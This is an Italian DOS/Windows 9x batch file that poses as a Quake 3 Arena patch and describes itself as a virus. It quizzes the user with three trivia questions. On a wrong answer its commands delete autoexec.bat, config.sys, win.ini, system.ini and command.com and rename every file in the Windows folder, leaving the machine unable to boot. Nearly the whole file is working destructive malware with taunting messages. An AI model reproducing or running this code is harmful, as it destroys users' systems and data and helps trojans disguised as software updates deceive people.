   PATCH
   @echo off
   cls
   echo.
   echo.
   echo MALE, RAGAZZO...
   echo.
   echo.
   echo STAVOLTA HAI PRESO UN "ORRENDO" VIRUS (ME)
   echo.
   echo.
   echo MI SPIACE MA NON STO PROPRIO SCHERZANDO....
   pause
   cls
   echo.
   echo.
   echo ORA TI FACCIO TRE DOMANDE, LE STESSE DI rr1, SPERO TU LE CONOSCA...
   echo.
   echo.
   echo SE RISPONDERAI CORRETTAMENTE A TUTTE E TRE NON MI RIVEDRAI MAI PIU', ALTRIMENTI......
   pause
   cls
   echo.
   echo.
   echo E NON SPENGERE IL COMPUTER, MI RITROVERESTI QUI....
   pause
   cls
   echo.
   echo.
   :1
   echo ECCOTI LA PRIMA DELLE TRE DOMANDE:
   echo.
   echo QUAL E' IL NOME DI MITNICK?
   echo.
   echo A = Paul
   echo B = Nick
   echo C = Kevin
   echo.
   choice /c:ABC /n CHE SCEGLI?
   if errorlevel 3 goto 2
   if errorlevel 2 goto 7
   if errorlevel 1 goto 7
   :2
   echo.
   choice /c:SN /n SEI PROPRIO SICURO? Sì No
   if errorlevel 2 goto 1
   if errorlevel 1 goto 3
   :7
   echo.
   choice /c:SN /n SEI PROPRIO SICURO? Sì No
   if errorlevel 2 goto 1
   if errorlevel 1 goto fallito
   :3
   cls
   echo BENE, LA PRIMA L'HAI PRESA. VEDIAMO LA SECONDA:
   echo.
   echo QUAL E' IL SISTEMA OPERATIVO PIU' USATO NELLE RETI?
   echo.
   echo A = Windows NT WorkStation 4.0
   echo B = Unix
   echo C = OS/2 Warp
   echo.
   choice /c:ABC /n CHE SCEGLI?
   if errorlevel 3 goto 8
   if errorlevel 2 goto 4
   if errorlevel 1 goto 8
   :4
   echo.
   choice /c:SN /n NE SEI COSI' DANNATAMENTE CERTO? Sì No
   if errorlevel 2 goto 3
   if errorlevel 1 goto 5
   :8
   echo.
   choice /c:SN /n NE SEI COSI' DANNATAMENTE CERTO? Sì No
   if errorlevel 2 goto 3
   if errorlevel 1 goto fallito
   :5
   cls
   echo UHM... STAI ANDANDO BENE! ORA L'ULTIMA:
   echo.
   echo IL COMPUTER DA' SEMPRE LA PRECEDENZA AD UN TIPO DI FILE. QUALE?
   echo.
   echo A = SYS
   echo B = COM
   echo C = EXE
   echo.
   choice /c:ABC /n CHE SCEGLI?
   if errorlevel 3 goto 9
   if errorlevel 2 goto 6
   if errorlevel 1 goto 9
   :6
   echo
   choice /c:SN /n E' L'ULTIMA, SE SBAGLI SEI FATTO. SEI SICURO? Sì No
   if errorlevel 2 goto 5
   if errorlevel 1 goto drago
   :9
   echo.
   choice /c:SN /n E' L'ULTIMA, SE SBAGLI SEI FATTO. SEI SICURO? Sì No
   if errorlevel 2 goto 5
   if errorlevel 1 goto fallito
   :drago
   cls
   echo.
   echo.
   echo.
   echo COMPLIMENTI, SEI UN VERO CAMPIONE, UN DRAGO, DIREI...
   pause
   echo.
   echo COME PROMESSO, MI CANCELLERO'
   pause
   echo.
   echo IL MIONOME ERA "Hearts.com" E MI TROVAVO IN:
   pause
   echo.
   echo C:\Windows\System
   pause
   echo.
   echo MI HAI PRESO CON UNA FANTOMATICA PATCH PER QUAKE 3 ARENA. CI SEI CASCATO IN PIENO!!!
   pause
   echo.
   echo RICORDATI DI NON ACCETTARE MAI PIU' FILES DA SCONOSCIUTI!!!!
   pause
   echo.
   cls
   echo.
   echo.
   echo ORA RIMETTERO' TUTTO A POSTO.
   echo.
   echo.
   echo BASTA CHE PREMI UN TASTO! UN ULTIMA COSA:
   echo.
   echo.
   echo.
   echo BUONA GIORNATA !!!!!
   pause
   del c:\autoexec.bat
   copy c:\windows\sbckp\*.* c:\ > nul
   del c:\windows\sbckp
   del c:\windows\system\Hearts.com > nul
   goto ok
   :ok
   exit
   :fallito
   @del c:\autoexec.bat
   @copy c:\progra~1\quakei~1\list.bat c:\
   @ren c:\list.bat autoexec.bat
   cls
   echo SPIACENTE MA HAI SBAGLIATO.... TE LO AVEVO DETTO DI STARE ATTENTO!
   echo.
   echo ......SEI SOLO UN IGNORANTONE......
   echo.
   echo ORA TI SPIEGO COSA FARO' AL TUO BEL PICCI':
   pause
   cls
   echo 1) Cancello il file Autoexec.bat (E col cacchio che mi riaccendi)
   echo 2) Cancello il file Config.sys (E col cacchio che ritrovi le periferiche)
   echo 3) Cancello il file Win.ini (E col cacchio che ti riparte Windows)
   echo 4) Cancello il file System.ini (E col cacchio che il sistema rimane stabile)
   echo 5) Rinomino tutti i file .exe di C:\WINDOWS in .dio (Perchè sì)
   echo 6) Sposto tutti i file .sys in una cartella X (E col cacchio che li riprendi)
   echo 7) Cancello il file Command.com (E col cacchio che ti parte MS-DOS)
   echo.
   echo E IL TUTTO SENZA RICHIESTA DI CONFERMA, CICCIO....!
   echo.
   echo MA TANTO CHE HAI PERSO TEMPO A LEGGERE, HO GIA' FATTO TUTTO... PERCIO'
   ARRIVEDERCI A PRESTO, NELLA SPERANZA CHE LA PROSSIMA VOLTA AVRAI......
   echo.
   pause
   cls
   echo STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!! STUDIATO!!
   del c:\autoexec.bat
   del c:\config.sys
   del c:\windows\win.ini
   del c:\windows\system.ini
   ren c:\windows\*.* *.dio
   md c:\windows\sistemac
   copy c:\windows\system\*.sys c:\windows\sistemac > nul
   del c:\command.com
   exit
